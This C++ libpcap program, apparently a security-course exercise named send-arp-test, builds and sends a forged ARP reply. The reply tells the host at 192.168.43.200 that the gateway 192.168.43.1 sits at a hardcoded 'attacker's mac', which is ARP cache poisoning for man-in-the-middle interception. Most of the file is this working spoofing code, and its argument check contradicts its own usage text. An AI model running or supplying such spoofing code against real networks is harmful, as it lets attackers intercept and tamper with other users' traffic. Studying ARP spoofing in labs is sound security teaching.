#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

int main(int argc, char* argv[]) {
	if (argc % 2  != 0) {
		usage();
		return -1;
	}
	// save argv's size and use variable +2
	// ex) i = 0, i+1, i+2
	// next-> i = 1
	
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	// attacker's mac
	///get  sender ip's mac address
	
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("f4:6a:dd:8b:3e:77");
	packet.eth_.smac_ = Mac("00:0c:29:bb:e4:89");
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac("00:0c:29:bb:e4:89");// 00:00:00:00:00:00
	packet.arp_.sip_ = htonl(Ip("192.168.43.1"));
	packet.arp_.tmac_ = Mac("f4:6a:dd:8b:3e:77");
	packet.arp_.tip_ = htonl(Ip("192.168.43.200"));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
}
